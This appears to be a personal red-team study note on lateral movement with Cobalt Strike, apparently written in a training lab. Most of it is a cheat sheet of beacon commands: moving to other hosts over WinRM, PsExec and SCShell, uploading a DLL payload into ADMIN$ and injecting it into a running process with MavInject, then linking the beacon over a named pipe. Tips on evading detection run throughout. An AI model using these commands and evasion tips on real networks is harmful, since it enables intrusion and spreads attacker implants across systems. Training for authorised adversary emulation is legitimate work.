_Lateral Movement_ is a tactic where the adversary attempts to gain access to other computers on the network. Cobalt Strike provides two base primitives for executing commands on a target.

`jump` : automates all steps required to execute new Beacon payload on target
	Upload payload
	Remote exec payload
	Connect to new Beacon session
	Delete payload from target

`remote-exec` : broader capability to execute remote commands on a target
	requires operator to carry out individual steps outlined in jump

Cheat Sheet
```powershell
# First impersonate user

# Syntax
beacon> jump [exploit] [target] [listener]
beacon> remote-exec [method] [target] [command]

# Check exploits / methods available
beacon> jump
beacon> remote-exec

# WinRM example
beacon> jump winrm64 lon-ws-1 smb 
beacon> remote-exec winrm lon-ws-1 net sessions

# PSExec example - BAD OPSEC
beacon> jump psexec lon-ws-1 smb

# SCShell example - PSExec alternative, BETTER OPSEC
Cobalt Strike > Script Manager > C:\Tools\SCShell\CS-BOF\scshell.cna #upload script
beacon> jump scshell64 lon-ws-1 smb

# WMI - MavInject example (LOLBAS)
beacon> remote-exec winrm [hostname] Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id  # Make note of PID and UserName
beacon> cd \\[hostname]\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll  # Use good name for OPSEC
beacon> remote-exec wmi [hostname] mavinject.exe [PID] /INJECTRUNNING C:\Windows\System32\smb_x64.dll # Inject DLL into process via MavInject
Cobalt Strike > Listeners > Edit listener # View pipename of listener used
beacon> link [HOSTNAME] [PIPENAME]
```
## Windows Remote Management
Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol, and allows remote management of computers via PowerShell.

Beacons executed via WinRM will run in the context of the current or impersonated user.

OPSEC Note: This executes payload within memory

Examples
```powershell
beacon> jump winrm64 lon-ws-1 smb 
beacon> remote-exec winrm lon-ws-1 net sessions  
```
NOTE: WinRM is only remote-exec method that returns output. Useful for enumeration.

## PSExec
This technique is named after a [tool](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) from the Sysinternals Suite and allows system administrators to execute processes on a remote system via the Service Control Manager.

Beacons executed via PsExec will always run as SYSTEM.

OPSEC NOTE: Avoid this if possible
	PsExec is generally regarded as one of the loudest lateral movement techniques.
	This is the only built-in technique that performs remote injection by default. It uploads the special service binary payload to disk and creates a new service to run it.
	New service creations are relatively rare events

```powershell
beacon> jump psexec64 lon-ws-1 smb
```
## Custom Techniques
Both the `jump` and `remote-exec` commands can be extended via Aggressor Script to add custom techniques. One example is [SCShell](https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF).
#### SCShell
This implements a variation of PsExec, where a service is modified instead of new service created. More stealthy!

Project includes CNA (Aggressor Script) file.

```powershell
# Load Aggressor script into client
Cobalt Strike > Script Manager > C:\Tools\SCShell\CS-BOF\scshell.cna

# Run
beacon> jump scshell64 lon-ws-1 smb
```
## Leveraging LOLBAS
Using a [LOLBAS](https://lolbas-project.github.io/) (Living Off The Land Binaries and Scripts) to facilitate lateral movement is popular amongst some threat actors.

OPSEC NOTE:
	Most mature organizations have a good handle on LOLBAS abuses.
	Blocked or possibly logged with Sysmon
	More applicable to adversary emulation.
#### MavInject
MavInject is a signed Microsoft executable that provides functionality for App-V to inject libraries into other process. Lives in System32/SysWOW64.

Can abuse to inject DLL into a target process.

WMI
```powershell
# List running processes on target
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id  # Make note of PID and UserName

# Upload DLL payload
beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll   # USE GOOD NAME FOR OPSEC

# Inject DLL into choesn process via MavInject
beacon> remote-exec wmi lon-ws-1 mavinject.exe [PID] /INJECTRUNNING C:\Windows\System32\smb_x64.dll

# Link to beacon
Cobalt Strike > Listeners > Edit listener # View pipename of listener used
beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```
![[Pasted image 20251228131514.png]]

## Security Logon Types
After moving laterally to a new computer, you may be unable to interact with domain services, move laterally again, etc... This is likely due to the logon type. See Logon Types for why.

WinRM and PSExec both use Network Type. 

Logon Types
	Interactive
	Network : the only logon method that does not leave leave creds in LSASS :(
	Batch
	Service
	NetworkCleartext
	NewCredentials
	RemoteInteractive

 The solution is to leverage a user impersonation technique, such as make_token or ptt, to populate the Beacon session with some credentials.  Only then will the session be able to authenticate to domain resources.